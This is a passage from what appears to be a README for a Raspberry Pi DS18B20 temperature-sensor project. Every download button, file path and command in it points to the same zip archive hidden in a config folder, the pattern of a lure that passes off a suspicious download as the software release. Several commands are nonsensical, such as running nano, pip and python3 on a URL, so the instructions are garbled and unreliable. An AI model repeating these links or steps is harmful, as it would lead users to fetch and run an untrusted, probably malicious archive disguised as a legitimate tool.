...
[![Download Latest Release](https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip%20Release-blue)](https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip)
...
2. Enter the following command to edit the boot configuration:
    ...
    ```
    sudo nano https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip
    ```
...
**[Download ds18b20_temp releases](https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip)**

### How to Download and Run

1. Click the button above or visit the link directly to see available versions.

2. Download the latest release package suitable for your system (usually a https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip or .zip file).
...
5. Install required Python libraries used by ds18b20_temp:
    ...
    ```
    pip3 install -r https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip
    ```

6. Run the software by typing:

    ```
    python3 https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip
    ```
...
- Confirm the 1-Wire interface is enabled by reviewing `https://github.com/Marco19519/ds18b20_temp/raw/refs/heads/master/config/b-ds-temp-Skodaic.zip`.
